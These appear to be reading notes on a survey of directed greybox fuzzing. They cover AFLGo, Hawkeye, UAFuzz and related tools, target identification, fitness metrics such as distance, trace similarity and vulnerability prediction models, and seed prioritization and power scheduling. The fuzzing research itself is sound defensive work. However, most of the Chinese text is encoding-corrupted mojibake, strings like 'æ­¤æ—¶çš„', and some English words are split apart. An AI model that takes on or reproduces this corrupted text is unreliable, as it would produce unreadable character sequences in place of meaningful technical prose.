6], as well as kernel code [7â€“9] and protocols[10-12]. testing software by blindly extending code coverage is less e fficient Originally, directed fuzzers were based on symbolic execution[14-17]. In 2017, B Ìˆohme et al. introduced the concept of directed greybox fuzzing (DGF) [18].æ­¤æ—¶çš„å®šå‘æ¨¡ç³Šæ˜¯éœ€è¦æ‰‹åŠ¨æ ‡è®°targetsï¼Œå¹¶ä¸”æ˜¯åŸºäºç§å­å’Œtargetsè·ç¦»æ¥è¿›è¡Œèƒ½é‡åˆ†é… New fitness metrics, such as trace similarity and vulnerability prediction modelsï¼ˆè·¯å¾„ç›¸ä¼¼æ€§å’Œæ¼æ´é¢„æµ‹æ¨¡å‹ï¼‰ Background CGF æ—¨åœ¨æœ€å¤§é™åº¦åœ°æé«˜ä»£ç è¦†ç›–ç‡ä»¥å‘ç°éšè—çš„é”™è¯¯ AFLåå‘äºè§¦å‘æ–°è·¯å¾„çš„ç§å­ï¼Œå¹¶ç»™äºˆå®ƒä»¬æ¯”éåå¥½è·¯å¾„çš„ä¼˜å…ˆæƒã€‚ä¸å…¶ä»–ä»ªå™¨åŒ–çš„æ¨¡ç³Šå™¨ç›¸æ¯”ï¼ŒAFLçš„æ€§èƒ½å¼€é”€ä¸å¤§ã€‚ CGFçš„æ•ˆç‡åä½ï¼Œå› ä¸ºåŠªåŠ›è¢«æµªè´¹åœ¨ébugåŒºåŸŸ ä»£è¡¨å·¥å…·AFL ç™½ç›’å®šå‘fuzzing ä»£è¡¨å·¥å…·ï¼šKLEEã€KATCHã€BugRedux å¤§å¤šåŸºäºç¬¦å·æ‰§è¡Œå¼•æ“å®ç° å®šå‘ç¬¦å·æ‰§è¡Œï¼ˆDSEï¼‰ä½¿ç”¨ç¨‹åºåˆ†æå’Œçº¦æŸè§£ç®—æ¥ç”Ÿæˆè¾“å…¥ï¼Œç³»ç»Ÿåœ°ã€æœ‰æ•ˆåœ°æ¢ç´¢å¯è¡Œè·¯å¾„çš„çŠ¶æ€ç©ºé—´[15]ã€‚ä¸€æ—¦ç¡®å®šäº†ç›®æ ‡è·¯å¾„ï¼Œå°±é€šè¿‡åˆ›å»ºæµ‹è¯•æ¡ˆä¾‹æ¥æ¢ç´¢è·¯å¾„çº¦æŸçš„æ½œåœ¨è§£å†³æ–¹æ¡ˆã€‚ç”±äºå¤§å¤šæ•°è·¯å¾„å®é™…ä¸Šæ˜¯ä¸å¯è¡Œçš„ï¼Œæœç´¢é€šå¸¸é€šè¿‡å¯»æ‰¾é€šå¾€ä¸­é—´ç›®æ ‡çš„å¯è¡Œè·¯å¾„æ¥åå¤è¿›è¡Œã€‚ DSEçš„æœ‰æ•ˆæ€§æ˜¯ä»¥æ•ˆç‡ä¸ºä»£ä»·çš„ã€‚DSEçš„é‡é‡çº§ç¨‹åºåˆ†æå’Œçº¦æŸæ¡ä»¶çš„è§£å†³æ˜¯ç›¸å½“è€—æ—¶çš„ã€‚ åŸºäºæœç´¢çš„è½¯ä»¶æµ‹è¯• åŸºäºæœç´¢çš„è½¯ä»¶æµ‹è¯•(SBST)å°†è½¯ä»¶æµ‹è¯•é—®é¢˜è½¬åŒ–ä¸ºè®¡ç®—æœç´¢é—®é¢˜ï¼Œå¯ä»¥ä½¿ç”¨å…ƒå¯å‘å¼æœç´¢æŠ€æœ¯è¿›è¡Œä¼˜åŒ–ï¼Œå¦‚çˆ¬å¡ã€æ¨¡æ‹Ÿé€€ç«å’Œé—ä¼ ç®—æ³•[44]ã€‚ DGF ä¸ç›²ç›®å¢åŠ è·¯å¾„è¦†ç›–ç‡çš„CGFä¸åŒï¼ŒDGFçš„ç›®æ ‡æ˜¯åˆ°è¾¾ä»£ç ä¸­é¢„å…ˆè¯†åˆ«çš„ä¸€ç»„ä½ç½®ï¼ˆå¯èƒ½æ˜¯æœ‰ç¼ºé™·çš„éƒ¨åˆ†ï¼‰ï¼Œå¹¶å°†å¤§éƒ¨åˆ†æ—¶é—´é¢„ç®—ç”¨äºåˆ°è¾¾ç›®æ ‡ä½ç½® åœ¨ç¼–è¯‘æ—¶ï¼Œé™¤äº†ä»ªå™¨åŒ–ï¼ŒAFLGoè¿˜è®¡ç®—è¾“å…¥å’Œé¢„å®šä¹‰ç›®æ ‡ä¹‹é—´çš„è·ç¦»ã€‚è¯¥è·ç¦»è¢«è®¡ç®—ä¸ºæ‰§è¡Œè½¨è¿¹åˆ°ç›®æ ‡åŸºæœ¬å—çš„å¹³å‡æƒé‡ã€‚æ‰§è¡Œè·Ÿè¸ªæƒé‡ç”±ç¨‹åºçš„è°ƒç”¨å›¾å’Œæ§åˆ¶æµå›¾ä¸­çš„è¾¹çš„æ•°é‡å†³å®šã€‚ç„¶åï¼Œåœ¨è¿è¡Œæ—¶ï¼ŒAFLGoæ ¹æ®è·ç¦»è€Œä¸æ˜¯æ–°çš„è·¯å¾„è¦†ç›–å¯¹ç§å­è¿›è¡Œä¼˜å…ˆæ’åºï¼Œå¹¶ä¼˜å…ˆè€ƒè™‘åœ¨åŸºæœ¬å—çº§è·ç¦»ä¸Šæ›´æ¥è¿‘ç›®æ ‡çš„ç§å­ã€‚ Methodology Inclusion and Exclusion Crieriaï¼ˆä½œè€…è®¤ä¸ºDGFçš„å®šä¹‰ï¼‰ æ ¸å¿ƒæœºåˆ¶åº”å½“æ˜¯ç°ç›’æ¨¡ç³Šæµ‹è¯•ï¼Œå…³é”®æ­¥éª¤æ˜¯ç§å­ä¼˜å…ˆçº§ï¼Œèƒ½é‡è°ƒåº¦ï¼Œmutatorè°ƒåº¦ å®šå‘æ€§åº”å½“ä½“ç°åœ¨åœ¨å…³é”®æ­¥éª¤ä¸­å¯¹fitness metricçš„ä¼˜åŒ– fitnessçš„ç›®æ ‡æ˜¯è¾¾åˆ°ä¸€ä¸ªç‰¹å®šä½ç½®æˆ–è§¦å‘ç¨‹åºçš„buggyè¡Œä¸º Data collection ä»æ¯ç¯‡è®ºæ–‡ä¸­æå–çš„æ•°æ®å°†æ˜¯ï¼š\nå‡ºç‰ˆæ¥æºï¼ˆå³ä¼šè®®ã€æœŸåˆŠæˆ–é¢„å°æœ¬ï¼‰å’Œå¹´ä»½ fitness goalã€‚è¾¾åˆ°ä»€ä¹ˆæ ·çš„ç›®æ ‡ç«™ç‚¹ï¼ˆä¾‹å¦‚ï¼Œæ˜“å—æ”»å‡»çš„åŠŸèƒ½ï¼‰æˆ–æš´éœ²å“ªäº›ç›®æ ‡bugï¼Ÿ åœ¨æ¨¡ç³Šæµ‹è¯•çš„è¿›åŒ–è¿‡ç¨‹ä¸­ä½¿ç”¨çš„fitness metricã€‚ä¾‹å¦‚ï¼Œåˆ°ç›®æ ‡çš„è·ç¦»ã€‚ å¦‚ä½•è¯†åˆ«æˆ–æ ‡è®°ç›®æ ‡ï¼Ÿä¾‹å¦‚ï¼Œç”±æ·±åº¦å­¦ä¹ æ¨¡å‹é¢„æµ‹çš„ã€‚ å®æ–½ä¿¡æ¯ã€‚è¯¥æ¨¡ç³Šå™¨æ˜¯åŸºäºä»€ä¹ˆå·¥å…·å®ç°çš„ï¼Ÿè¯¥æ¨¡ç³Šå™¨æ˜¯å¼€æºçš„å—ï¼Ÿ è¯¥å·¥å…·æ˜¯å¦æ”¯æŒäºŒè¿›åˆ¶ä»£ç åˆ†æï¼Ÿ è¯¥å·¥å…·æ˜¯å¦æ”¯æŒå†…æ ¸åˆ†æï¼Ÿ è¯¥å·¥å…·æ˜¯å¦æ”¯æŒå¤šç›®æ ‡æœç´¢ï¼Ÿ è¯¥å·¥å…·æ˜¯å¦æ”¯æŒå¤šç›®æ ‡ä¼˜åŒ–ï¼Ÿ æ¨¡ç³Šå¤„ç†ä¸­çš„å“ªäº›å…³é”®æ­¥éª¤è¢«ä¼˜åŒ–ä»¥å®ç°å®šå‘æ€§ï¼Ÿå³è¾“å…¥ä¼˜åŒ–ã€ç§å­ä¼˜å…ˆçº§ã€åŠŸç‡è°ƒåº¦ã€çªå˜å™¨è°ƒåº¦å’Œçªå˜æ“ä½œã€‚ åœ¨ä¼˜åŒ–è¿‡ç¨‹ä¸­é‡‡ç”¨äº†å“ªäº›æŠ€æœ¯ï¼Ÿå³æ§åˆ¶æµåˆ†æã€é™æ€åˆ†æã€æ•°æ®æµåˆ†æã€æœºå™¨å­¦ä¹ ã€è¯­ä¹‰åˆ†æå’Œç¬¦å·æ‰§è¡Œã€‚ Data Analysis åœ¨æœ€æ–°çš„DGFç ”ç©¶ä¸­ï¼Œç›®æ ‡è¯†åˆ«æ–¹æ³•æ˜¯å¦‚ä½•å˜åŒ–çš„ï¼Ÿ é™¤äº†è·ç¦»ä¹‹å¤–ï¼Œåœ¨DGFçš„æœ€æ–°å‘å±•ä¸­ï¼Œæ˜¯å¦æœ‰ä»»ä½•æ–°çš„fitness metricï¼Ÿ æœ€è¿‘çš„DGFå·¥å…·æ˜¯å¦‚ä½•åœ¨æ¨¡ç³Šæµ‹è¯•çš„å…³é”®æ­¥éª¤ä¸Šè¿›è¡Œä¼˜åŒ–çš„ï¼Ÿ What are the challenges of the DGF research? Are there any potential solutionï¼Ÿ DGFçš„å…¸å‹åº”ç”¨æ˜¯ä»€ä¹ˆï¼Ÿå¦‚ä½•ä¸ºä¸€ä¸ªç‰¹å®šçš„åº”ç”¨åœºæ™¯é€‰æ‹©ä¸€ä¸ªDGFå·¥å…·ï¼Ÿ æœªæ¥DGFç ”ç©¶çš„è¶‹åŠ¿æ˜¯ä»€ä¹ˆï¼Ÿ Research Progress on Directed Greybox Fuzzing overview è®¾è®¡æ–°çš„fitnessï¼ˆUAFuzz, UAFL,LOLLY, Berry, CAFL.ï¼‰æˆ–è€…å®ç°mutil-dimensional fitenessï¼ˆAFL-HR, HDRFuzz, AFLProï¼‰ æœºå™¨å­¦ä¹ ç»™targetsè‡ªåŠ¨æ‰“æ ‡ç­¾ SUZZER, V-Fuzz, De-Fuzz, SemFuzzï¼›åˆ©ç”¨å…¶ä»–ä¿¡æ¯æ¥ç»™targetæ‰“æ ‡ç­¾ DrillerGo, TortoiseFuzz, AFLChrun, GREYHOUND,DeltaFuzz, 1DVUL, SAVIOR, HDR-Fuzz. å€ŸåŠ©æ•°æ®æµåˆ†æå’Œè¯­ä¹‰åˆ†ææ¥ç”Ÿæˆåˆæ³•çš„è¾“å…¥ï¼Œå€ŸåŠ©ç¬¦å·æ‰§è¡Œæ¥é€šè¿‡å¤æ‚çš„é™åˆ¶ï¼ŒTOFU,TIFF, SemFuzz, KCFuzz, 1DVUL, SAVIOR. åˆ©ç”¨å¯å‘å¼ç®—æ³•çš„AFLChrun, LOLLY, GREYHOUND è¿‡æ»¤æ— æ•ˆè¾“å…¥ FuzzGuard, BEACON æ£€æµ‹å…·ä½“çš„ bug ç±»å‹ MemLock, SlowFuzz, PERFFUZZ, MDPERFFUZZ. å±€é™æ€§ï¼šè´¹ç”¨æ‰£é™¤ã€ç­‰æƒåº¦é‡åå·®ã€å‹˜æ¢å¼€å‘åè°ƒä¸çµæ´»ã€æºä»£ç ä¾èµ–ã€ç¼ºä¹å¤šç›®æ ‡ä¼˜åŒ–ã€ç¼ºä¹å¤šç›®æ ‡åè°ƒç­‰\nTarget Identification target locations æ‰‹åŠ¨æ ‡æ³¨target locationéœ€è¦æºç è¡Œå·æˆ–è€…è™šæ‹Ÿå†…å­˜åœ°å€ è¾…åŠ©çš„å…ƒæ•°æ®ï¼šgitæäº¤æ—¥å¿—[19]ä¸­çš„ä»£ç å˜æ›´ï¼Œä»bugè·Ÿè¸ª[25]ä¸­æå–çš„ä¿¡æ¯ï¼ŒCVEæ¼æ´æè¿°çš„è¯­ä¹‰[12,23,24]ï¼Œæˆ–æ·±åº¦å­¦ä¹ æ¨¡å‹[27-29]ï¼Œä»¥å¸®åŠ©è¯†åˆ«ä»£ç ä¸­çš„æ¼æ´å‡½æ•°[23,24,27-29]ï¼Œå…³é”®ç«™ç‚¹[71]ï¼Œsyntaxtoken[72]ï¼Œå®Œæ•´æ€§æ£€æŸ¥[30,73]ï¼Œä»¥åŠè¡¥ä¸ç›¸å…³åˆ†æ”¯[20,22] é™æ€åˆ†æå·¥å…·å¯ä»¥è‡ªåŠ¨çš„æ‰¾åˆ°æ½œåœ¨çš„ç›®æ ‡åŒºåŸŸï¼Œä¸€èˆ¬è¿™ç§å·¥å…·åªé€‚ç”¨äºç‰¹å®šçš„è¯­è¨€ ç¼–è¯‘sanitiserå·¥å…·æ³¨é‡Šæ½œåœ¨çš„bugs äºŒè¿›åˆ¶çº§åˆ«çš„æ¯”è¾ƒè¯†åˆ«è¡¥ä¸ç›¸å…³åˆ†æ”¯ æ·±åº¦å­¦ä¹ æ–¹æ³•åœ¨äºŒè¿›åˆ¶ç¨‹åºå’ŒæŠ½è±¡è¯­æ³•æ ‘çº§åˆ«é¢„æµ‹æ½œåœ¨çš„è„†å¼±ä»£ç  æ”»å‡»é¢è¯†åˆ«ç»„ä»¶ä¹Ÿè¢«ç”¨æ¥è¯†åˆ«targets target bugs åˆ©ç”¨targetè¡Œä¸ºåºåˆ—æ¥è¯†åˆ«æ¼æ´ å¯¹äºDGFç±»å‹çš„ç›®æ ‡æ˜¯ç‰¹å®šçš„bugï¼Œä¸éœ€è¦åœ¨PUTä¸­æ ‡è®°ç›®æ ‡ï¼Œè¿™æ„å‘³ç€fuzzerå¯ä»¥è‡ªåŠ¨è¯†åˆ«å¹¶ä»¥è¿›åŒ–çš„æ–¹å¼è§¦å‘è¿™äº›bugã€‚ Fitness Metrics distance è¿™é‡Œæåˆ°çš„å‡ ç¯‡è®ºæ–‡å¯ä»¥çœ‹çœ‹ åŸºäºè·ç¦»çš„æ–¹æ³•çš„ä¸€ä¸ªç¼ºç‚¹æ˜¯å®ƒåªå…³æ³¨æœ€çŸ­çš„è·ç¦»ï¼Œå› æ­¤å½“æœ‰å¤šä¸ªè·¯å¾„åˆ°è¾¾åŒä¸€ä¸ªç›®æ ‡æ—¶ï¼Œå¯èƒ½ä¼šå¿½ç•¥è¾ƒé•¿çš„é€‰é¡¹ï¼Œä»è€Œå¯¼è‡´å·®å¼‚ åœ¨è®¡ç®—åŸºæœ¬å—çº§åˆ«çš„è·ç¦»æ—¶ï¼Œéœ€è¦èŠ±è´¹ç›¸å½“å¤šçš„æ—¶é—´ similarity æ‰§è¡Œè½¨è¿¹ hawkeyeä¸­é¦–æ¬¡æå‡ºï¼Œå°†åŸºæœ¬å—è¿¹è·ç¦»ä¸è¦†ç›–å‡½æ•°ç›¸ä¼¼åº¦ç›¸ç»“åˆï¼Œç”¨äºç§å­ä¼˜å…ˆçº§å’ŒåŠŸç‡è°ƒåº¦ Berry[77]åŒæ ·æ˜¯ä»¥æ‰§è¡Œè½¨è¿¹çš„ç›¸ä¼¼æ€§ä½œä¸ºè¡¡é‡æŒ‡æ ‡ ç›¸ä¼¼åº¦æ˜¯æŸä¸ªåº¦é‡çš„å½“å‰çŠ¶æ€å’Œç›®æ ‡çŠ¶æ€ä¹‹é—´çš„é‡å ç¨‹åº¦ï¼Œå…¶ä¸­åº¦é‡åŒ…æ‹¬bugè·Ÿè¸ªçš„é•¿åº¦ï¼Œè¦†ç›–çš„ä½ç½®ã€è¦†ç›–çš„æ“ä½œæˆ–è¦†ç›–çš„å‡½æ•°çš„æ•°é‡ã€‚ æ“ä½œåºåˆ—ï¼ˆç¨‹åºè¡Œä¸ºï¼Ÿï¼‰ UAFL[32]ä½¿ç”¨æ“ä½œåºåˆ—è¦†ç›–æ¥æŒ‡å¯¼æµ‹è¯•ç”¨ä¾‹çš„ç”Ÿæˆï¼Œä»¥é€æ­¥è¦†ç›–å¯èƒ½è§¦å‘é‡Šæ”¾åä½¿ç”¨æ¼æ´çš„æ“ä½œåºåˆ—ã€‚ UAFuzz[25]è¿˜ä½¿ç”¨ä¸€ä¸ªåºåˆ—æ„ŸçŸ¥çš„ç›®æ ‡ç›¸ä¼¼æ€§åº¦é‡æ¥åº¦é‡ç§å­æ‰§è¡Œå’Œç›®æ ‡é‡Šæ”¾åä½¿ç”¨çš„é”™è¯¯è·Ÿè¸ªä¹‹é—´çš„ç›¸ä¼¼æ€§ã€‚ SAVIOR[73]æ ¹æ®UBSané¢„æµ‹çš„æ ‡ç­¾è¦†ç›–[78]ï¼Œä¼˜å…ˆè€ƒè™‘å…·æœ‰æ›´é«˜è§¦å‘æ¼æ´æ½œåŠ›çš„ç§å­ã€‚ TortoiseFuzz[23]åŒºåˆ†ä¸æ•æ„Ÿå†…å­˜æ“ä½œå¯†åˆ‡ç›¸å…³çš„è¾¹ï¼Œå¹¶æ ¹æ®å®ƒä»¬æ‰§è¡Œè·¯å¾„ä¸­çš„æ•æ„Ÿè¾¹å‘½ä¸­è®¡æ•°ä¼˜å…ˆæ’åºç§å­ã€‚ æ€»çš„æ¥è¯´è¿™éƒ¨åˆ†çš„è®ºæ–‡å°±æ˜¯æµ‹é‡ç§å­è·¯å¾„æˆ–è€…è¡Œä¸ºå’Œèƒ½å¤Ÿè¾¾åˆ°targetsçš„è¾“å…¥çš„è·¯å¾„æˆ–è¡Œä¸ºä¹‹é—´çš„ç›¸ä¼¼åº¦ï¼Œç›¸ä¼¼åº¦è¶Šé«˜çš„ç§å­å¾—åˆ°æ›´å¤šçš„èƒ½é‡ã€‚ å’Œdistanceç›¸æ¯” åŸºäºç›¸ä¼¼æ€§çš„åº¦é‡æ¯”åŸºäºè·ç¦»çš„æ›¿ä»£æ–¹æ³•æ›´èƒ½å¤„ç†å¤šç›®æ ‡æ‹Ÿåˆã€‚ ^dfb282 åŸºäºè·ç¦»çš„åº¦é‡è®¡ç®—å¼€é”€å¤§ï¼ŒåŸºäºç›¸ä¼¼åº¦çš„åº¦é‡å¯ä»¥ä»ç›¸å¯¹è¾ƒé«˜çš„çº§åˆ«æå–ï¼Œä»¥æé«˜æ•´ä½“æ•ˆç‡ã€‚ Vulnerability Prediction Models åˆ©ç”¨åŸºäºæ·±åº¦å­¦ä¹ çš„æ¨¡å‹ï¼Œå¯ä»¥é¢„æµ‹å‡½æ•°çš„è„†å¼±æ¦‚ç‡ï¼Œå¹¶ä¸ºè„†å¼±å‡½æ•°ä¸­çš„æ¯ä¸ªåŸºæœ¬å—ç»™å‡ºä¸€ä¸ªé™æ€è„†å¼±è¯„åˆ†æ¥è¡¡é‡å‡½æ•°çš„è„†å¼±æ¦‚ç‡ã€‚ç„¶åï¼Œå¯¹äºæ¯ä¸ªè¾“å…¥ï¼Œæ‰§è¡Œè·¯å¾„ä¸Šæ‰€æœ‰åŸºæœ¬å—çš„é™æ€è„†å¼±å¾—åˆ†ä¹‹å’Œè¢«ç”¨ä½œé€‚åº”åº¦å¾—åˆ†ï¼Œä»¥ä¼˜å…ˆè€ƒè™‘å¾—åˆ†è¾ƒé«˜çš„è¾“å…¥[27,28]ã€‚ TAFL[76]æå–PUTçš„è¯­ä¹‰åº¦é‡ï¼Œå¹¶ä½¿ç”¨é™æ€è¯­ä¹‰åº¦é‡æ¥æ ‡è®°åŒºåŸŸï¼ŒåŒ…æ‹¬æ•æ„Ÿã€å¤æ‚ã€æ·±åº¦å’Œéš¾ä»¥åˆ°è¾¾çš„åŒºåŸŸï¼Œè¿™äº›åŒºåŸŸåŒ…å«æ¼æ´çš„æ¦‚ç‡æ›´é«˜ï¼Œå¹¶åŠ å¼ºäº†å¯¹è¿™äº›åŒºåŸŸçš„æ¨¡ç³Šå¤„ç†ã€‚ Joffe[6]ä½¿ç”¨ç¥ç»ç½‘ç»œç”Ÿæˆçš„å´©æºƒå¯èƒ½æ€§æ¥æŒ‡å¯¼æ¨¡ç³Šå¤„ç†å®¹æ˜“å´©æºƒçš„æ‰§è¡Œã€‚åŸºäºæ¦‚ç‡çš„åº¦é‡å¯ä»¥å°†ç§å­ä¼˜å…ˆçº§ä¸ç›®æ ‡è¯†åˆ«ç»“åˆèµ·æ¥ï¼Œåœ¨ä¸ä¾èµ–æºä»£ç çš„æƒ…å†µä¸‹å°†æ¨¡ç³Šå®šä½æŒ‡å‘æ½œåœ¨çš„è„†å¼±ä½ç½®ã€‚ æ·±åº¦å­¦ä¹ çš„æ–¹æ³•ç›®å‰çš„ä¸€ä¸ªä¸»è¦ç¼ºç‚¹æ˜¯ç²¾åº¦åœ¨ä¸€å®šç¨‹åº¦ä¸Šå—åˆ°é™åˆ¶ã€‚ other W ustholzet al[68]ä½¿ç”¨åœ¨çº¿é™æ€å‰ç»åˆ†ææ¥ç¡®å®šä¸€ä¸ªè·¯å¾„å‰ç¼€ï¼Œè¯¥è·¯å¾„å‰ç¼€çš„æ‰€æœ‰åç¼€è·¯å¾„éƒ½ä¸èƒ½åˆ°è¾¾ç›®æ ‡ä½ç½®ã€‚ç„¶åï¼Œé€šè¿‡æˆ˜ç•¥æ€§åœ°è°ƒåº¦æ¨¡ç³Šçš„èƒ½é‡æ¥å¼ºè°ƒå¯èƒ½åˆ°è¾¾ç›®æ ‡ä½ç½®çš„è·¯å¾„å‰ç¼€æ¥å¯ç”¨å®šå‘æ¨¡ç³Šã€‚ KCFuzz[71]å°†ç›®æ ‡è·¯å¾„ä¸­çš„çˆ¶èŠ‚ç‚¹å®šä¹‰ä¸ºå…³é”®ç‚¹ï¼Œå¹¶ä½¿ç”¨å…³é”®ç‚¹è¦†ç›–æ¥æŒ‡å¯¼æ¨¡ç³Šå¤„ç†ã€‚ CAFL[84]æ—¨åœ¨æ»¡è¶³ä¸€ç³»åˆ—çº¦æŸ(å³ç›®æ ‡ç«™ç‚¹å’Œæ•°æ®æ¡ä»¶çš„ç»„åˆ)ï¼Œè€Œä¸æ˜¯è¾¾åˆ°ä¸€ç»„ç›®æ ‡ç«™ç‚¹ã€‚å®ƒå°†çº¦æŸçš„è·ç¦»å®šä¹‰ä¸ºä¸€ä¸ªç»™å®šçš„ç§å­æ»¡è¶³çº¦æŸçš„ç¨‹åº¦ï¼Œå¹¶æŒ‰é¡ºåºä¼˜å…ˆè€ƒè™‘æ›´å¥½åœ°æ»¡è¶³çº¦æŸçš„ç§å­ã€‚ AFL-HR[81]å’ŒHDR-Fuzz[85]é‡‡ç”¨äº†ä¸€ç§é¢å‘æ¼æ´çš„é€‚åº”åº¦åº¦é‡ï¼Œç§°ä¸ºå‡€ç©º(headroom)ï¼Œå®ƒè¡¨æ˜æµ‹è¯•è¾“å…¥åœ¨ç»™å®šæ¼æ´ä½ç½®æš´éœ²éš¾ä»¥æ˜¾ç¤ºçš„æ¼æ´(ä¾‹å¦‚ï¼Œç¼“å†²åŒºæˆ–æ•´æ•°æº¢å‡º)çš„å¯†åˆ‡ç¨‹åº¦ã€‚ PERFFUZZ[34]ä½¿ç”¨æ‰€æœ‰ç¨‹åºä½ç½®çš„æ‰§è¡Œè®¡æ•°çš„æ–°æœ€å¤§å€¼ä½œä¸ºåé¦ˆæ¥ç”Ÿæˆç—…æ€è¾“å…¥ã€‚ä¸ºäº†ç³»ç»Ÿåœ°åº¦é‡é€‚åº”åº¦ï¼Œå®šåˆ¶çš„é€‚åº”åº¦åº¦é‡è¿˜åŒæ—¶è€ƒè™‘å¤šä¸ªç»´åº¦ï¼ŒåŒ…æ‹¬åŸºæœ¬ä»£ç è¦†ç›–ç‡ã€å—æƒé‡ã€çŠ¶æ€è½¬æ¢æ•°é‡ã€æ‰§è¡Œæ—¶é—´ã€å¼‚å¸¸è®¡æ•°ç­‰ç­‰[12,86]ã€‚ æ­¤å¤–ï¼ŒéåŠŸèƒ½æ€§å±æ€§ï¼Œå¦‚å†…å­˜ä½¿ç”¨[31]å’Œæœºå™¨äººè½¦è¾†çš„æ§åˆ¶ä¸ç¨³å®šæ€§[33]ä¹Ÿå¯ä»¥ç”¨æ¥æŒ‡å¯¼æ¨¡ç³Šã€‚ Fuzzing Optimization 71%ä¾é æ§åˆ¶æµåˆ†ææ¥è¯„ä»·ç§å­å’Œç¡®å®šå¯¹ç›®æ ‡çš„å¯è¾¾æ€§ 60%åˆ©ç”¨é™æ€åˆ†æè‡ªåŠ¨è¯†åˆ«ç›®æ ‡[73]ï¼Œå¹¶ä»PUTä¸­æå–ä¿¡æ¯[67,68] 21%çš„äººä½¿ç”¨æ•°æ®æµåˆ†æ(ä¸»è¦æ±¡æŸ“åˆ†æ)æ¥è¯†åˆ«è¾“å…¥å’Œå…³é”®ç¨‹åºå˜é‡ä¹‹é—´çš„å…³ç³»[20,87,88]æˆ–ä¼˜åŒ–ä»¿çœŸå™¨è°ƒåº¦[32] 12%çš„äººä½¿ç”¨æœºå™¨å­¦ä¹ æ¥é¢„æµ‹æ˜“å—æ”»å‡»çš„ä»£ç [27]å¹¶è¿‡æ»¤æ‰ä¸å¯è¾¾çš„è¾“å…¥[89] 12%çš„äººé›†æˆç¬¦å·(concolic)æ‰§è¡Œæ¥è§£å†³å¤æ‚çš„è·¯å¾„çº¦æŸ[20,24,73,77]; 14%é‡‡ç”¨è¯­ä¹‰åˆ†æè‡ªåŠ¨**è¯†åˆ«è„†å¼±ç›®æ ‡[19,24,76]ï¼Œå­¦ä¹ è¾“å…¥å­—æ®µè¯­ä¹‰è¿›è¡Œä¼˜åŒ–ã€‚ input optimization å¥½çš„seed inputåº”è¯¥å¯ä»¥ä¿ƒä½¿fuzzingè¿›ç¨‹é è¿‘targetsï¼Œå¹¶ä¸”æå‡ç¨åçš„å˜å¼‚è¿›ç¨‹çš„æ€§èƒ½ AFLGOæœ‰91.7%çš„è¾“å…¥ä¸èƒ½åˆ°è¾¾buggy code å¯ä»¥ç”¨åŠ¨æ€æ±¡ç‚¹åˆ†æå’Œè¯­ä¹‰ä¿¡æ¯æ¥æ„å»ºåˆæ³•çš„è¾“å…¥ FuzzGuardåˆ©ç”¨æ·±åº¦å­¦ä¹ æ–¹æ³•æ¥é¢„æµ‹å’Œè¿‡æ»¤è¾“å…¥ BEACON[90]ä½¿ç”¨è½»é‡çº§é™æ€åˆ†æå‰”é™¤ä¸å¯è¡Œçš„è·¯å¾„(å³åœ¨è¿è¡Œæ—¶æ— æ³•åˆ°è¾¾ç›®æ ‡ä»£ç çš„è·¯å¾„ seed prioritization DGFçš„æ ¸å¿ƒæ˜¯å¯¹æœ€æ¥è¿‘targetsçš„ç§å­(ç”¨äºçªå˜)è¿›è¡Œä¼˜å…ˆæ’åº ç§å­ä¼˜å…ˆçº§çš„æ’åºä¸»è¦åŸºäºæ§åˆ¶æµåˆ†æ åŸºäºè·ç¦»çš„æ–¹æ³•[18,20,25,30,67,69,70]ä»PUTçš„è°ƒç”¨å’Œæ§åˆ¶æµå›¾ä¸­çš„è¾¹æ•°è®¡ç®—åˆ°ç›®æ ‡åŸºæœ¬å—çš„è·ç¦»ã€‚ åŸºäºç›¸ä¼¼æ€§çš„æ–¹æ³•[23,25,32,77,83]å°†ç§å­è¦†ç›–æ§åˆ¶æµå›¾ä¸Šç›®æ ‡è¾¹çš„èƒ½åŠ›ä½œä¸ºè¯„ä¼°ç§å­çš„åº¦é‡ã€‚ åŸºäºé¢„æµ‹æ¨¡å‹çš„æ–¹æ³•[27,28]ä¹Ÿä¾èµ–äºæœ‰å±æ€§çš„æ§åˆ¶æµå›¾(å³ä½¿ç”¨æ•°å€¼å‘é‡æ¥æè¿°æ§åˆ¶æµå›¾ä¸­çš„åŸºæœ¬å—ï¼Œå…¶ä¸­å‘é‡çš„æ¯ä¸ªç»´åº¦è¡¨ç¤ºåŸºæœ¬å—çš„ç‰¹å®šå±æ€§çš„å€¼)æ¥è¡¨ç¤ºäºŒè¿›åˆ¶ç¨‹åºå¹¶æå–ç”¨äºæ·±åº¦å­¦ä¹ çš„ç‰¹å¾ã€‚ å®šå‘æ··åˆæ¨¡ç³Š[20,24,71,73,77]ç»“åˆäº†DSEçš„ç²¾åº¦å’ŒDGFçš„å¯ä¼¸ç¼©æ€§ï¼Œä»¥å‡è½»å®ƒä»¬å„è‡ªçš„å¼±ç‚¹ã€‚DGFå¯ä»¥å¯¹è¾“å…¥çªå˜è¿›è¡Œä¼˜å…ˆæ’åºå’Œè°ƒåº¦ï¼Œä»è€Œå¿«é€Ÿæ¥è¿‘ç›®æ ‡ï¼Œè€ŒDSEå¯ä»¥é€šè¿‡è§£å†³å¤æ‚çš„è·¯å¾„çº¦æŸæ¥å®ç°æ›´æ·±å…¥çš„ä»£ç ã€‚ power scheduling å®šå‘ç°ç›’å¤§å¤šé‡‡å–çš„éƒ½æ˜¯æ¨¡æ‹Ÿé€€ç«ç®—æ³•ï¼Œæ¨¡æ‹Ÿé€€ç«ç®—æ³•æœ‰ä¸€å®šæ¦‚ç‡ä¼šé‡‡ç”¨æ¯”å½“å‰ç§å­æ•ˆæœå·®çš„ç§å­ï¼Œè¿™æ ·å¯ä»¥è·³å‡ºå±€éƒ¨æœ€ä¼˜è§£ï¼Œå¾—åˆ°å…¨å±€æœ€ä¼˜è§£ã€‚ AFLGo[18]æ˜¯ç¬¬ä¸€ä¸ªä½¿ç”¨æ¨¡æ‹Ÿé€€ç«ä¸ºåŸºç¡€çš„åŠŸç‡è®¡åˆ’ï¼Œé€æ­¥å°†æ›´å¤šçš„èƒ½é‡åˆ†é…ç»™æ›´æ¥è¿‘ç›®æ ‡ä½ç½®çš„ç§å­ï¼ŒåŒæ—¶å‡å°‘è·ç¦»è¾ƒè¿œçš„ç§å­çš„èƒ½é‡ã€‚ Hawkeye[67]åœ¨æ¨¡æ‹Ÿé€€ç«ä¸­å¢åŠ äº†ä¼˜å…ˆçº§ï¼Œå…è®¸æ›´æ¥è¿‘ç›®æ ‡çš„ç§å­å…ˆçªå˜ã€‚ 